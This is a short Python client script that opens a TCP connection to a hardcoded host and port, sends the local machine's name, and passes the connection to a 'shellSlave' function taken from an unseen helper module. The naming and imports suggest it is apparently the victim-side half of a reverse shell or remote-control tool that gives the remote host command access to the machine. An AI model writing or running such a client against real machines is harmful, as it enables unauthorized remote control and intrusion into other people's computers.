import socket
import threading
import os
import subprocess
from Utileries import *

HEADER = 64
PORT = 5555
SERVER_IP = "192.168.0.8"
ADDR = (SERVER_IP,PORT)
FORMAT = "utf-8"
DISCONNECT_MSG = "Disco!"
NAME = "Client"

slaveConn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
slaveConn.connect(ADDR)
sendMsg(slaveConn,str(os.environ['COMPUTERNAME']))
shellSlave(slaveConn)
